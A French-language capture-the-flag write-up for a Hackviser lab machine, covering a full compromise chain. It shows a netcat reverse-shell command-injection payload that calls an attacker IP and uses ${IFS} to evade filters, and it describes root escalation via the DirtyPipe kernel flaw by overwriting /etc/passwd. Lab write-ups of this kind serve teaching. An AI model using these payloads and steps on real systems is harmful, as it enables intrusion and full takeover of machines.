# Bot Busters - Hackviser CTF Writeup

## 1. Énumération Initiale et Accès

L'exploration a commencé par l'analyse de l'application web cible. Une vulnérabilité d'injection de commandes a été découverte dans le panneau d'attaque (endpoint `/attack`), permettant l'exécution arbitraire de commandes. Une charge utile de type reverse shell (via netcat, en contournant les filtres d'espacement avec `${IFS}`) a permis d'obtenir un accès initial sur la machine cible (Comet) en tant qu'utilisateur `blackbot`.

```bash
8.8.8.8;nc${IFS}10.8.96.29${IFS}9001${IFS}-e${IFS}/bin/bash
```

## 2. Énumération Interne et Identification de la Faille

Une fois sur le système avec l'utilisateur limit, une reconnaissance interne a été effectuée pour trouver un vecteur d'escalade de privilèges :

- Les tentatives habituelles sur les binaires SUID mal configurés (pas de `pkexec` exploitable pour PwnKit, pas de faille sur `sudo` type CVE-2021-3156) n'ont donné aucune piste facilement exploitable pour s'échapper.
- Cependant, la vérification de la version du noyau Linux (`uname -a`) a révélé une information cruciale : la machine tournait sous la version **5.11.0-051100-generic**.

**Conclusion (Task 3)** : Cette version de noyau (entre 5.8 et 5.16.11) est connue pour être vulnérable à la faille **CVE-2022-0847**, surnommée **DirtyPipe**. Cette vulnérabilité critique permet à un utilisateur non privilégié d'écrire dans des fichiers en lecture seule (comme `/etc/passwd`), ce qui ouvre la voie vers l'obtention des privilèges `root`.

## 3. Exploitation (Privilege Escalation)

L'exploitation de DirtyPipe a été réalisée en suivant ces étapes directement depuis le dossier `/tmp` (accessible en écriture par n'importe quel utilisateur) :

1. **Récupération du payload** : L'exploit en C (version d'Alexis Ahmed) a été transféré sur la cible via un serveur HTTP Python local ou directement avec Wget/Curl vers notre machine distante, enregistré sous le nom `exp.c`.
2. **Compilation** : La machine cible possédant `gcc`, le code a été compilé de la façon suivante :
   `gcc exp.c -o exploit`
3. **Exécution** : En lançant le binaire sur un programme possédant les droits Root (par exemple un binaire SUID basique), l'exploit DirtyPipe a altéré temporairement le cache des pages de la mémoire pour modifier le fichier `/etc/passwd`. Le mot de passe de l'utilisateur root est réécrit (souvent `piped`).
4. **Pivoter Root** : Avec la commande `su root` (et le mot de passe `piped`), un accès total (super-utilisateur `#`) a été accordé.

## 4. Post-Exploitation (Task 4 & 5)

Une fois l'escalade de privilèges validée, le répertoire protégé `/root` était enfin accessible pour récolter les flags finaux concernant le botnet :

- **Task 4 (Numéro de l'attaquant)** :
  En cherchant le numéro de contact du pirate (dont on avait vu le potentiel format plus tôt), nous avons lu le fichier contenant le secret :

  ```bash
  cat /root/secret.txt
  # Résultat trouvé : +1(555)123-4567
  ```

- **Task 5 (Cibles du Botnet)** :
  Il restait à trouver la liste des serveurs que le botnet s'apprêtait à attaquer :

  ```bash
  cat /root/targets.txt
  ```

  Le fichier a révélé la liste des cibles prévues par l'attaquant (ex: `fakesolutions.net`).

---
Cette infrastructure représente un cheminement CTF classique et redoutable : exécution de code à distance (RCE) via une mauvaise sanitisation des inputs web, aboutissant à une compromission locale évitant les SUID communs, pour finir sur une faille noyau ravageuse (DirtyPipe) permettant de prendre le contrôle intégral de la machine.
